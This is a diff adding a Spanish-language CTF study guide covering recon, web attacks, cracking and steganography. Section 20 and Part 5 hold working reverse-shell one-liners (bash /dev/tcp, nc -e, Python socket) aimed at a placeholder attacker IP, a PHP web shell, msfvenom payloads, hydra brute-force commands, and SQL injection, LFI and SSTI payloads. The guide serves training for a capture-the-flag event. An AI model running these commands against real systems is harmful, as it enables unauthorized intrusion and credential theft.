+</ul>
+<blockquote>Cuándo cada uno: <code>feroxbuster</code> si quieres recursión automática; <code>ffuf</code> para fuzzear parámetros/subdominios (mueves <code>FUZZ</code>); <code>gobuster</code> es el clásico simple. Los tres hacen lo mismo de base.</blockquote>
+<h2 id="20-inyección-de-shell-de-ejecuto-comandos-a-tengo-una-consola">20. Inyección de shell — de "ejecuto comandos" a "tengo una consola"<a class="anchor" href="#20-inyección-de-shell-de-ejecuto-comandos-a-tengo-una-consola">#</a></h2>
+<p>Contexto: en un reto web con <strong>command injection</strong> (sección 17) o un servicio vulnerable, muchas veces no basta con <code>; cat flag.txt</code>: necesitas una <strong>shell interactiva</strong> en la máquina para moverte. Eso es "inyectar una shell". Solo contra la infraestructura del reto.</p>
+<h3 id="paso-1-en-tu-máquina-kali-ponte-a-escuchar">Paso 1 — en TU máquina (Kali), ponte a escuchar<a class="anchor" href="#paso-1-en-tu-máquina-kali-ponte-a-escuchar">#</a></h3>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>nc -lvnp 4444</code></pre></div>
+<ul>
+<li><code>nc</code> = netcat. <code>-l</code> = modo escucha (listener). <code>-v</code> = verboso. <code>-n</code> = sin DNS. <code>-p 4444</code> = puerto donde esperas la conexión.</li>
+<li>Aquí <strong>llegará</strong> la shell de la víctima. Déjalo abierto.</li>
+</ul>
+<h3 id="paso-2-en-la-víctima-vía-la-inyección-lanza-la-reverse-shell">Paso 2 — en la víctima (vía la inyección), lanza la reverse shell<a class="anchor" href="#paso-2-en-la-víctima-vía-la-inyección-lanza-la-reverse-shell">#</a></h3>
+<p>Pones uno de estos como comando inyectado. <code>TU_IP</code> = la IP de tu Kali, <code>4444</code> = el puerto de arriba.</p>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>bash -i &gt;&amp; /dev/tcp/TU_IP/4444 0&gt;&amp;1</code></pre></div>
+<ul>
+<li>Abre una bash interactiva (<code>-i</code>) y <strong>redirige</strong> su entrada/salida al socket TCP hacia tu máquina. La más usada en Linux.</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>nc TU_IP 4444 -e /bin/sh</code></pre></div>
+<ul>
+<li>netcat conecta a tu listener y <code>-e</code> le entrega una <code>/bin/sh</code>. (No todos los <code>nc</code> traen <code>-e</code>.)</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("TU_IP",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh"])'</code></pre></div>
+<ul>
+<li>Si hay Python en la víctima: crea el socket, engancha stdin/stdout/stderr y lanza una shell. Útil cuando <code>nc</code> no tiene <code>-e</code>.</li>
+</ul>
+<blockquote><strong>Reverse</strong> (la víctima se conecta a ti) suele funcionar mejor que <strong>bind</strong> (tú te conectas a la víctima), porque los firewalls bloquean conexiones entrantes a la víctima pero no las salientes.</blockquote>
+<h3 id="paso-3-estabilizar-la-shell-que-funcionen-flechas-ctrl-c-nano">Paso 3 — estabilizar la shell (que funcionen flechas, Ctrl-C, nano)<a class="anchor" href="#paso-3-estabilizar-la-shell-que-funcionen-flechas-ctrl-c-nano">#</a></h3>
+<p>Una reverse shell cruda es incómoda. Para volverla usable:</p>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>python3 -c 'import pty;pty.spawn("/bin/bash")'   # en la shell recibida
+# luego pulsas: Ctrl-Z
+stty raw -echo; fg                                # en TU Kali
+export TERM=xterm                                 # de vuelta en la shell</code></pre></div>
+<ul>
+<li><code>pty.spawn</code> te da una pseudo-terminal real. El <code>stty raw -echo; fg</code> devuelve el control del teclado. Ya puedes usar <code>sudo</code>, editores, etc.</li>
+</ul>
+<h3 id="web-shell-cuando-puedes-subir-un-archivo">Web shell (cuando puedes SUBIR un archivo)<a class="anchor" href="#web-shell-cuando-puedes-subir-un-archivo">#</a></h3>
+<p>Si el reto deja subir archivos y el servidor ejecuta PHP:</p>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="php"><code>&lt;?php system($_GET['c']); ?&gt;</code></pre></div>
+<ul>
+<li>Lo guardas como <code>shell.php</code>, lo subes, y luego:</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>curl "http://OBJETIVO/uploads/shell.php?c=id"
+curl "http://OBJETIVO/uploads/shell.php?c=cat%20/flag.txt"</code></pre></div>
+<ul>
+<li><code>?c=</code> = el comando a ejecutar (<code>%20</code> es un espacio en URL). Desde aquí puedes lanzar la reverse shell del Paso 2.</li>
+</ul>
+<h3 id="qué-hacer-ya-con-una-shell-dentro">Qué hacer ya con una shell dentro<a class="anchor" href="#qué-hacer-ya-con-una-shell-dentro">#</a></h3>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>id ; whoami ; hostname        # quién soy y dónde
+find / -name 'flag*' 2&gt;/dev/null   # buscar la bandera por todo el disco
+cat /home/*/flag.txt /flag.txt 2&gt;/dev/null
+sudo -l                        # ¿qué puedo correr como root sin pass? (escalada)</code></pre></div>
+<ul>
+<li><code>find / -name 'flag*' 2&gt;/dev/null</code> = busca archivos que empiecen con "flag" en todo el sistema; <code>2&gt;/dev/null</code> esconde los errores de permisos.</li>
+<li><code>sudo -l</code> + <strong>GTFOBins</strong> (lo descargaste) = ruta típica para escalar a root y leer la flag protegida.</li>
+</ul>
+<blockquote>Para el writeup: documenta el <strong>listener</strong>, el <strong>comando inyectado exacto</strong>, y el <code>cat</code> que reveló la flag. Es una cadena muy vistosa para la rúbrica (reconocimiento → inyección → shell → flag).</blockquote>
+<h3 id="usar-un-web-shell-que-ya-subiste-post-explotación">Usar un web shell que ya subiste (post-explotación)<a class="anchor" href="#usar-un-web-shell-que-ya-subiste-post-explotación">#</a></h3>
+<p>Si subiste un <code>shell.php</code> que ejecuta <code>system($_GET['cmd'])</code>, le pasas comandos por la URL:</p>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>curl -G "http://IP/ruta/shell.php" --data-urlencode "cmd=id"
+curl -G "http://IP/ruta/shell.php" --data-urlencode "cmd=find / -name 'flag*' 2&gt;/dev/null"</code></pre></div>
+<ul>
+<li><code>-G</code> = manda GET con los datos en la URL (<code>?cmd=...</code>). <code>--data-urlencode</code> = codifica espacios/comillas para que el comando no se rompa.</li>
+<li>Desde aquí enumeras: <code>cat /etc/passwd</code>, consultar la BD con <code>mysql -u USER -p'PASS' -e 'show databases;'</code>, y finalmente lanzar la reverse shell del paso 2.</li>
+<li><strong>Interpretar:</strong> la respuesta HTTP trae la salida del comando. Si sale vacío o un error PHP, prueba otro parámetro (<code>c</code>, <code>cmd</code>, <code>0</code>) o revisa que el archivo exista.</li>
+</ul>
+<hr>
+<h1 id="parte-5-hydra-y-metasploit-ambos-zona-gris">PARTE 5 — Hydra y Metasploit (⚠️ ambos zona gris)<a class="anchor" href="#parte-5-hydra-y-metasploit-ambos-zona-gris">#</a></h1>
+<blockquote>Regla 5 del evento: son <strong>automatizados</strong>, pregunta a los organizadores antes de usarlos. Si puedes, haz el equivalente manual y documéntalo (100% de estilo).</blockquote>
+<h2 id="21-hydra-fuerza-bruta-de-login-en-línea">21. hydra — fuerza bruta de login (en línea)<a class="anchor" href="#21-hydra-fuerza-bruta-de-login-en-línea">#</a></h2>
+<ul>
+<li><strong>Por qué:</strong> prueba miles de usuario/contraseña contra un servicio de login (SSH, FTP, HTTP...).</li>
+<li><strong>Cuándo:</strong> tienes un login y sospechas credenciales débiles. Ojo: es ruidoso y automatizado (zona gris).</li>
+<li><strong>Cómo:</strong> <code>hydra -l USUARIO -P LISTA.txt SERVICIO://OBJETIVO</code></li>
+<ul>
+<li><code>-l</code> = un usuario fijo · <code>-L</code> = lista de usuarios · <code>-P</code> = lista de contraseñas · <code>-p</code> = una contraseña fija.</li>
+</ul>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code># SSH con un usuario conocido
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.5
+
+# FTP
+hydra -l ftpuser -P rockyou.txt ftp://10.10.10.5
+
+# login web por POST (el formato pide: ruta:campos:texto-de-fallo)
+hydra -l admin -P rockyou.txt 10.10.10.5 http-post-form \
+  "/login.php:user=^USER^&amp;pass=^PASS^:Invalid"</code></pre></div>
+<ul>
+<li>En el formulario web: <code>^USER^</code>/<code>^PASS^</code> es donde inyecta cada intento, y <code>Invalid</code> es el texto que aparece <strong>cuando falla</strong> (hydra lo usa para saber qué NO funcionó).</li>
+<li><strong>Interpretar:</strong></li>
+<ul>
+<li><code>[22][ssh] host: ... login: admin password: hunter2</code> → <strong>credencial encontrada</strong>.</li>
+<li>Termina sin esa línea → no estaba en la lista.</li>
+<li><code>all children died</code> / errores de conexión → el servicio te está bloqueando o el puerto está mal.</li>
+</ul>
+</ul>
+<h2 id="22-msfconsole-metasploit-framework-de-explotación">22. msfconsole — Metasploit (framework de explotación)<a class="anchor" href="#22-msfconsole-metasploit-framework-de-explotación">#</a></h2>
+<ul>
+<li><strong>Por qué:</strong> tiene exploits y payloads listos para vulnerabilidades conocidas; automatiza la explotación.</li>
+<li><strong>Cuándo:</strong> identificaste servicio+versión vulnerable (con <code>nmap -sV</code>/<code>searchsploit</code>) y hay módulo. Zona gris: confirma reglas; para estilo, prefiere el exploit manual.</li>
+<li><strong>Cómo (flujo dentro de la consola):</strong></li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>msfconsole                      # abrir (tarda unos segundos)</code></pre></div>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre><code>search projectsend              # buscar módulo por software
+use exploit/ruta/del/modulo     # seleccionarlo
+info                            # leer qué hace y qué opciones pide
+show options                    # ver parámetros obligatorios
+set RHOSTS 10.10.10.5           # objetivo
+set LHOST TU_IP                 # tu IP (para la reverse shell)
+set LPORT 4444
+check                           # (si el módulo lo soporta) ¿es vulnerable?
+run                             # lanzar</code></pre></div>
+<ul>
+<li><strong>Interpretar:</strong></li>
+<ul>
+<li><code>[+] ... The target is vulnerable</code> (de <code>check</code>) → adelante con <code>run</code>.</li>
+<li><code>Meterpreter session 1 opened</code> → <strong>entraste</strong>; escribe <code>shell</code> para una consola, o <code>getuid</code>, <code>sysinfo</code>.</li>
+<li><code>Exploit completed, but no session was created</code> → falló: revisa <code>LHOST</code>, el payload (<code>set payload ...</code>) o que de verdad sea vulnerable.</li>
+<li><code>search</code> sin resultados → no hay módulo; vuelve a <code>searchsploit</code> y hazlo manual.</li>
+</ul>
+<li><strong>Payload útil para generar un ejecutable/reverse (msfvenom):</strong></li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=TU_IP LPORT=4444 -f elf -o rev.elf</code></pre></div>
+<ul>
+<ul>
+<li>Lo subes a la víctima y lo ejecutas mientras escuchas con <code>nc -lvnp 4444</code>.</li>
+</ul>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre><code></code></pre></div>
+</section>
+<section class="doc" id="sec-guia" data-sec="guia">
+<h1 id="guía-explicada-por-qué-cuándo-cómo-e-interpretar">Guía explicada — por qué, cuándo, cómo e interpretar<a class="anchor" href="#guía-explicada-por-qué-cuándo-cómo-e-interpretar">#</a></h1>
+<p>Complemento de estudio de <code>COMANDOS.md</code>. Aquí cada comando trae: <strong>Por qué</strong> sirve · <strong>Cuándo</strong> usarlo · <strong>Cómo</strong> · <strong>Ejemplo</strong> chico · <strong>Interpretar</strong> (qué significa lo que ves). Convención: MAYÚSCULAS = lo cambias tú. Formato de bandera del evento: <code>flag{...}</code> o <code>CyberFEI{...}</code>.</p>
+<hr>
+<h1 id="a-triage-lo-primero-con-cualquier-archivo">A. Triage — lo primero con cualquier archivo<a class="anchor" href="#a-triage-lo-primero-con-cualquier-archivo">#</a></h1>
+<h3 id="file-archivo"><code>file ARCHIVO</code><a class="anchor" href="#file-archivo">#</a></h3>
+<ul>
+<li><strong>Por qué:</strong> lee los primeros bytes (magic bytes) y dice el tipo <strong>real</strong>, ignorando la extensión. En CTF las extensiones mienten a propósito.</li>
+<li><strong>Cuándo:</strong> nada más recibir un archivo, siempre el primero.</li>
+<li><strong>Cómo:</strong> <code>file sospechoso</code></li>
+<li><strong>Ejemplo:</strong> <code>file reto.jpg</code></li>
+<li><strong>Interpretar:</strong></li>
+<ul>
+<li><code>JPEG image data</code> → es lo que dice, sigue con estego.</li>
+<li><code>Zip archive data</code> aunque se llame <code>.jpg</code> → le cambiaron la extensión; renómbralo a <code>.zip</code>.</li>
+<li><code>data</code> → tipo desconocido o header corrupto/borrado: mira <code>xxd</code> y arregla los magic bytes.</li>
+<li><code>ELF 64-bit executable</code> → binario Linux, vas a reversing.</li>
+</ul>
+</ul>
+<h3 id="strings--n-6-archivo"><code>strings -n 6 ARCHIVO</code><a class="anchor" href="#strings--n-6-archivo">#</a></h3>
+<ul>
+<li><strong>Por qué:</strong> extrae el texto legible escondido entre los bytes. Muchísimas flags están en claro.</li>
+<li><strong>Cuándo:</strong> con cualquier archivo binario, imagen, dump o ejecutable.</li>
+<li><strong>Cómo:</strong> <code>strings -n 6 ARCHIVO</code> ( <code>-n 6</code> = mínimo 6 caracteres, quita ruido).</li>
+<li><strong>Ejemplo:</strong> <code>strings -n 6 reto.bin | grep -iE 'flag|cyberfei'</code></li>
+<li><strong>Interpretar:</strong></li>
+<ul>
+<li>Sale <code>CyberFEI{...}</code> → terminaste, era texto plano.</li>
+<li>Ves rutas (<code>/home/user/...</code>), nombres de función, mensajes ("Wrong password") → pistas de cómo funciona el programa.</li>
+<li>No sale nada útil → quizá esté comprimido/cifrado dentro: prueba <code>binwalk</code>.</li>
+</ul>
+</ul>
+<h3 id="exiftool-archivo"><code>exiftool ARCHIVO</code><a class="anchor" href="#exiftool-archivo">#</a></h3>
+<ul>
+<li><strong>Por qué:</strong> muestra metadatos: autor, fecha, GPS, software, y el campo <strong>Comment</strong> (donde suelen meter la flag).</li>
+<li><strong>Cuándo:</strong> imágenes, PDFs, audio, documentos.</li>
+<li><strong>Cómo:</strong> <code>exiftool foto.jpg</code></li>
+<li><strong>Ejemplo:</strong> <code>exiftool -a -G1 foto.jpg</code> ( <code>-a</code> todo, <code>-G1</code> agrupado por origen).</li>
+<li><strong>Interpretar:</strong></li>
+<ul>
+<li>Campo <code>Comment: ZmxhZ3t...</code> → decodifícalo (parece base64).</li>
+<li><code>GPS Position: 19.4 N, 99.1 W</code> → el reto pregunta un lugar; busca esas coordenadas.</li>
+<li><code>Software: Adobe...</code> o fechas raras → posible pista narrativa del reto.</li>
+</ul>
+</ul>
+<h3 id="binwalk-archivo-binwalk--e-archivo"><code>binwalk ARCHIVO</code> / <code>binwalk -e ARCHIVO</code><a class="anchor" href="#binwalk-archivo-binwalk--e-archivo">#</a></h3>
+<ul>
+<li><strong>Por qué:</strong> detecta y extrae <strong>archivos escondidos dentro de otro</strong> (un ZIP dentro de un PNG, etc.).</li>
+<li><strong>Cuándo:</strong> cuando <code>file</code>/<code>strings</code> no bastan y sospechas algo incrustado.</li>
+<li><strong>Cómo:</strong> <code>binwalk reto.png</code> para ver; <code>binwalk -e reto.png</code> para extraer.</li>
+<li><strong>Ejemplo:</strong> <code>binwalk -e captura.png</code></li>
+<li><strong>Interpretar:</strong></li>
+<ul>
+<li>Lista con <code>Zip archive</code>, <code>PNG image</code>, <code>gzip compressed</code> en distintos offsets → hay varios archivos pegados; <code>-e</code> los saca a <code>_reto.png.extracted/</code>.</li>
+<li>Solo una línea con el tipo esperado → no hay nada incrustado, prueba <code>zsteg</code>/<code>steghide</code>.</li>
+</ul>
+</ul>
+<h3 id="xxd-archivo-head"><code>xxd ARCHIVO | head</code><a class="anchor" href="#xxd-archivo-head">#</a></h3>
+<ul>
+<li><strong>Por qué:</strong> volcado hex + ASCII; te deja ver y comparar los <strong>magic bytes</strong> del inicio.</li>
+<li><strong>Cuándo:</strong> cuando <code>file</code> dice <code>data</code> o un archivo "no abre".</li>
+<li><strong>Cómo:</strong> <code>xxd ARCHIVO | head</code></li>
+<li><strong>Ejemplo:</strong> <code>xxd reto.png | head -1</code></li>
+<li><strong>Interpretar:</strong> compara el inicio con la firma correcta:</li>
+<ul>
+<li>PNG debe empezar <code>89 50 4E 47</code>. Si ves <code>00 00 00 00</code>, le borraron el header → arréglalo con un editor hex.</li>
+<li><code>50 4B 03 04</code> (<code>PK</code>) = ZIP. <code>FF D8 FF</code> = JPG. <code>25 50 44 46</code> (<code>%PDF</code>) = PDF.</li>
+</ul>
+</ul>
+<hr>
+<h1 id="b-red-y-servicios">B. Red y servicios<a class="anchor" href="#b-red-y-servicios">#</a></h1>
+<h3 id="nmap--sc--sv--p--objetivo"><code>nmap -sC -sV -p- OBJETIVO</code><a class="anchor" href="#nmap--sc--sv--p--objetivo">#</a></h3>
+<ul>
+<li><strong>Por qué:</strong> descubre qué puertos/servicios están vivos y su versión → por ahí atacas.</li>
+<li><strong>Cuándo:</strong> el reto te da una IP o host.</li>
+<li><strong>Cómo:</strong> <code>-p-</code> todos los puertos, <code>-sV</code> versión, <code>-sC</code> scripts básicos.</li>
+<li><strong>Ejemplo:</strong> <code>nmap -sC -sV -p- 10.10.10.5 -oN nmap.txt</code></li>
+<li><strong>Interpretar:</strong></li>
+<ul>
+<li><code>80/tcp open http Apache 2.4.49</code> → hay web; apunta <code>searchsploit apache 2.4.49</code>.</li>
+<li><code>open</code> = accesible · <code>closed</code> = puerto responde pero sin servicio · <code>filtered</code> = firewall lo bloquea (prueba <code>-Pn</code>).</li>
+<li>El número de puerto te dice el camino: 21=FTP, 22=SSH, 80/443=web, 3306=MySQL, 445=SMB.</li>
+</ul>
+</ul>
+<h3 id="nc-objetivo-puerto"><code>nc OBJETIVO PUERTO</code><a class="anchor" href="#nc-objetivo-puerto">#</a></h3>
+<ul>
+<li><strong>Por qué:</strong> te conecta "a pelo" a un servicio para hablar con él.</li>
+<li><strong>Cuándo:</strong> retos que te dan <code>host puerto</code> (misc, pwn jr, banner grabbing).</li>
+<li><strong>Cómo:</strong> <code>nc 10.10.10.5 1337</code></li>
+<li><strong>Ejemplo:</strong> <code>nc 10.10.10.5 1337</code></li>
+<li><strong>Interpretar:</strong></li>
+<ul>
+<li>Te sale un menú o pregunta → responde según pida (a veces es resolver operaciones rápido).</li>
+<li>Un banner <code>220 ProFTPD 1.3.5</code> → versión del servicio → <code>searchsploit</code>.</li>
+<li>Silencio total → quizá espera que TÚ mandes algo primero.</li>
+</ul>
+</ul>
+<hr>
+<h1 id="c-web">C. Web<a class="anchor" href="#c-web">#</a></h1>
+<h3 id="curl--i-httpobjetivo"><code>curl -I http://OBJETIVO</code><a class="anchor" href="#curl--i-httpobjetivo">#</a></h3>
+<ul>
+<li><strong>Por qué:</strong> muestra solo las cabeceras de respuesta sin descargar la página.</li>
+<li><strong>Cuándo:</strong> reconocimiento web rápido; ver servidor, cookies, redirecciones.</li>
+<li><strong>Cómo:</strong> <code>-I</code> solo headers; <code>-i</code> headers + cuerpo.</li>
+<li><strong>Ejemplo:</strong> <code>curl -I http://OBJETIVO</code></li>
+<li><strong>Interpretar:</strong></li>
+<ul>
+<li><code>HTTP/1.1 200 OK</code> → existe y carga. <code>301/302</code> → redirige (mira <code>Location:</code>). <code>403</code> → prohibido (existe pero sin acceso). <code>401</code> → pide login. <code>500</code> → error del servidor (a veces explotable).</li>
+<li><code>Set-Cookie: role=user</code> → cookie manipulable (cámbiala a <code>admin</code>).</li>
+<li><code>Server: nginx/1.18</code> / <code>X-Powered-By: PHP/7.4</code> → tecnología → exploits.</li>
+</ul>
+</ul>
+<h3 id="curl-con-opciones-post-cookie-proxy"><code>curl</code> con opciones (POST, cookie, proxy)<a class="anchor" href="#curl-con-opciones-post-cookie-proxy">#</a></h3>
+<ul>
+<li><strong>Por qué:</strong> manda peticiones a medida sin navegador (a veces el navegador oculta cosas).</li>
+<li><strong>Cuándo:</strong> probar logins, enviar parámetros, pasar por Burp.</li>
+<li><strong>Cómo:</strong></li>
+<ul>
+<li><code>curl -X POST -d "u=admin&amp;p=1234" http://OBJETIVO/login</code> (envía formulario)</li>
+<li><code>curl -b "admin=1" http://OBJETIVO/panel</code> (manda cookie)</li>
+<li><code>curl -x http://127.0.0.1:8080 http://OBJETIVO</code> (lo pasa por Burp)</li>
+</ul>
+<li><strong>Ejemplo:</strong> <code>curl -s http://OBJETIVO/ | grep -i flag</code></li>
+<li><strong>Interpretar:</strong> compara el cuerpo según cambias la petición. Si al mandar <code>admin=1</code> aparece contenido nuevo → la cookie controlaba el acceso.</li>
+</ul>
+<h3 id="feroxbuster--u-httpobjetivo-ferro"><code>feroxbuster -u http://OBJETIVO</code> ("ferro")<a class="anchor" href="#feroxbuster--u-httpobjetivo-ferro">#</a></h3>
+<ul>
+<li><strong>Por qué:</strong> descubre rutas/archivos ocultos probando una wordlist, y baja <strong>recursivamente</strong> en lo que encuentra.</li>
+<li><strong>Cuándo:</strong> toda web; buscas <code>/admin</code>, <code>/backup</code>, <code>/flag.txt</code>.</li>
+<li><strong>Cómo:</strong> <code>feroxbuster -u http://OBJETIVO -x php,txt,bak -d 2 -C 404,403</code></li>
+<li><strong>Ejemplo:</strong> <code>feroxbuster -u http://OBJETIVO -o ferox.txt</code></li>
+<li><strong>Interpretar la columna de estado:</strong></li>
+<ul>
+<li><code>200</code> → existe y accesible (¡míralo!).</li>
+<li><code>301/302</code> → redirección (suele ser una carpeta; ferox entra solo).</li>
+<li><code>403</code> → existe pero prohibido (interesante: hay algo que esconden).</li>
+<li><code>401</code> → pide autenticación.</li>
+<li>El tamaño (bytes) igual en muchas respuestas = el "404 bonito"; fíltralo con <code>-C</code> o por tamaño.</li>
+</ul>
+</ul>
+<h3 id="inyección-sql-detectar-a-mano">Inyección SQL — detectar a mano<a class="anchor" href="#inyección-sql-detectar-a-mano">#</a></h3>
+<ul>
+<li><strong>Por qué:</strong> si un input va sin sanear a la consulta SQL, puedes leer la BD.</li>
+<li><strong>Cuándo:</strong> logins, buscadores, <code>?id=1</code>.</li>
+<li><strong>Cómo:</strong> mete comillas y lógica: <code>' OR '1'='1</code>, <code>admin'--</code>, <code>' ORDER BY 3--</code>.</li>
+<li><strong>Ejemplo:</strong> en el usuario pon <code>admin'--</code> y cualquier contraseña.</li>
+<li><strong>Interpretar:</strong></li>
+<ul>
+<li>Entras sin contraseña válida → inyección confirmada.</li>
+<li><code>ORDER BY 3</code> funciona pero <code>ORDER BY 4</code> da error → hay <strong>3 columnas</strong> (úsalas en el <code>UNION SELECT 1,2,3--</code>).</li>
+<li>Error de SQL en pantalla → vulnerable y encima te filtra el motor (MySQL, etc.).</li>
+</ul>
+</ul>
+<h3 id="ssti-77">SSTI — <code>{{7*7}}</code><a class="anchor" href="#ssti-77">#</a></h3>
+<ul>
+<li><strong>Por qué:</strong> si la plantilla evalúa tu entrada, puedes llegar a ejecutar código.</li>
+<li><strong>Cuándo:</strong> campos que reflejan tu texto (nombre, saludo).</li>
+<li><strong>Cómo:</strong> manda <code>{{7*7}}</code> (o <code>${7*7}</code>, <code>#{7*7}</code>).</li>
+<li><strong>Interpretar:</strong> si responde <code>49</code> → <strong>inyectable</strong> (lo evaluó). Si responde literal <code>{{7*7}}</code> → no lo es.</li>
+</ul>
+<h3 id="lfi-fileetcpasswd">LFI — <code>?file=../../../../etc/passwd</code><a class="anchor" href="#lfi-fileetcpasswd">#</a></h3>
+<ul>
+<li><strong>Por qué:</strong> subir por el árbol de carpetas deja leer archivos del sistema.</li>
+<li><strong>Cuándo:</strong> parámetros tipo <code>?page=</code>, <code>?file=</code>.</li>
+<li><strong>Interpretar:</strong></li>
+<ul>
+<li>Ves <code>root:x:0:0:</code> → es <code>/etc/passwd</code>: LFI confirmada.</li>
+<li>Con <code>php://filter/convert.base64-encode/resource=index.php</code> te sale base64 → decodifícalo para leer el código PHP (ahí suele estar la flag o credenciales).</li>
+</ul>
+</ul>
+<hr>
+<h1 id="d-contraseñas-y-hashes">D. Contraseñas y hashes<a class="anchor" href="#d-contraseñas-y-hashes">#</a></h1>
+<h3 id="hashid-hash"><code>hashid 'HASH'</code><a class="anchor" href="#hashid-hash">#</a></h3>
+<ul>
+<li><strong>Por qué:</strong> identifica el tipo de hash para elegir el modo correcto al romperlo.</li>
+<li><strong>Cuándo:</strong> te dan un hash suelto o lo sacaste de una BD.</li>
+<li><strong>Ejemplo:</strong> <code>hashid '5f4dcc3b5aa765d61d8327deb882cf99'</code></li>
+<li><strong>Interpretar:</strong> te lista candidatos (<code>MD5</code>, <code>NTLM</code>...). La longitud ayuda: 32 hex = MD5/NTLM, 40 = SHA1, 64 = SHA256.</li>
+</ul>
+<h3 id="hashcat--m-modo-hashtxt-rockyoutxt"><code>hashcat -m MODO hash.txt rockyou.txt</code><a class="anchor" href="#hashcat--m-modo-hashtxt-rockyoutxt">#</a></h3>
+<ul>
+<li><strong>Por qué:</strong> prueba millones de contraseñas de un diccionario contra el hash (usa GPU).</li>
+<li><strong>Cuándo:</strong> ya sabes el tipo (con <code>hashid</code>).</li>
+<li><strong>Cómo:</strong> <code>-m</code> el modo (0=MD5, 100=SHA1, 1400=SHA256, 1800=sha512crypt, 3200=bcrypt, 16500=JWT), <code>-a 0</code> diccionario.</li>
+<li><strong>Ejemplo:</strong> <code>hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt</code></li>
+<li><strong>Interpretar:</strong></li>
+<ul>
+<li><code>Status: Cracked</code> + <code>hash:password</code> → esa es la contraseña.</li>
+<li><code>Status: Exhausted</code> → no estaba en el diccionario (prueba máscara <code>-a 3 '?d?d?d?d'</code> o reglas).</li>
+<li>Ver la contraseña después: <code>hashcat -m 0 hash.txt --show</code>.</li>
+</ul>
+</ul>
+<h3 id="john---wordlistrockyoutxt-htxt-y-zip2john"><code>john --wordlist=rockyou.txt h.txt</code> y <code>zip2john</code><a class="anchor" href="#john---wordlistrockyoutxt-htxt-y-zip2john">#</a></h3>
+<ul>
+<li><strong>Por qué:</strong> John rompe hashes y, con <code>*2john</code>, archivos protegidos (ZIP, PDF, RAR, SSH).</li>
+<li><strong>Cuándo:</strong> ZIP/PDF con contraseña, o hashes variados.</li>
+<li><strong>Cómo:</strong> <code>zip2john secreto.zip &gt; h.txt &amp;&amp; john --wordlist=rockyou.txt h.txt</code></li>
+<li><strong>Ejemplo:</strong> <code>john --show h.txt</code></li>
+<li><strong>Interpretar:</strong> <code>secreto.zip:contraseña</code> → úsala para <code>unzip</code>. Si no imprime nada tras terminar → no estaba en el diccionario.</li>
+</ul>
+<hr>
+<h1 id="e-esteganografía">E. Esteganografía<a class="anchor" href="#e-esteganografía">#</a></h1>
+<h3 id="zsteg--a-imgpng"><code>zsteg -a img.png</code><a class="anchor" href="#zsteg--a-imgpng">#</a></h3>
+<ul>
+<li><strong>Por qué:</strong> revisa los bits menos significativos (LSB) de PNG/BMP, truco de estego clásico.</li>
+<li><strong>Cuándo:</strong> imagen PNG/BMP y <code>strings</code>/<code>binwalk</code> no dieron nada.</li>
+<li><strong>Ejemplo:</strong> <code>zsteg -a reto.png</code></li>
+<li><strong>Interpretar:</strong> una línea tipo <code>b1,rgb,lsb,xy .. text: "CyberFEI{...}"</code> → ahí está. Puro ruido/basura en todas → no es LSB; prueba <code>steghide</code> o Stegsolve.</li>
+</ul>
+<h3 id="steghide-extract--sf-imgjpg-stegseek-imgjpg-rockyoutxt"><code>steghide extract -sf img.jpg</code> / <code>stegseek img.jpg rockyou.txt</code><a class="anchor" href="#steghide-extract--sf-imgjpg-stegseek-imgjpg-rockyoutxt">#</a></h3>
+<ul>
+<li><strong>Por qué:</strong> steghide esconde datos con contraseña en JPG/BMP/WAV; stegseek la rompe por diccionario.</li>
+<li><strong>Cuándo:</strong> JPG/WAV sospechoso.</li>
+<li><strong>Ejemplo:</strong> <code>steghide extract -sf reto.jpg</code> (prueba Enter = sin pass, o palabras del reto).</li>
+<li><strong>Interpretar:</strong></li>
+<ul>
+<li><code>wrote extracted data to "secreto.txt"</code> → ábrelo, ahí viene algo.</li>
+<li><code>could not extract...</code> con pass vacía → tiene contraseña: usa <code>stegseek</code>.</li>
+<li>stegseek: <code>Found passphrase: "xxx"</code> + extrae el archivo → listo.</li>
+</ul>
+</ul>
+<h3 id="audio-espectrograma">Audio → espectrograma<a class="anchor" href="#audio-espectrograma">#</a></h3>
+<ul>
+<li><strong>Por qué:</strong> muchos mensajes se "dibujan" en el espectro de frecuencias, no se oyen.</li>
+<li><strong>Cuándo:</strong> el reto te da un audio sin razón aparente.</li>
+<li><strong>Cómo:</strong> ábrelo en <strong>Audacity</strong> → menú de la pista → <strong>Espectrograma</strong>.</li>
+<li><strong>Interpretar:</strong> si ves letras/figuras formadas en la imagen del espectro → esa es la flag.</li>
+</ul>
+<hr>
+<h1 id="f-tráfico-de-red-pcap">F. Tráfico de red (.pcap)<a class="anchor" href="#f-tráfico-de-red-pcap">#</a></h1>
+<h3 id="wireshark-follow-tcp-stream">Wireshark: Follow TCP Stream<a class="anchor" href="#wireshark-follow-tcp-stream">#</a></h3>
+<ul>
+<li><strong>Por qué:</strong> reconstruye una conversación completa (lo que mandó cliente y servidor) en texto legible.</li>
+<li><strong>Cuándo:</strong> casi todo pcap. Es tu reflejo #1.</li>
+<li><strong>Cómo:</strong> clic derecho en un paquete → Follow → TCP/HTTP Stream.</li>
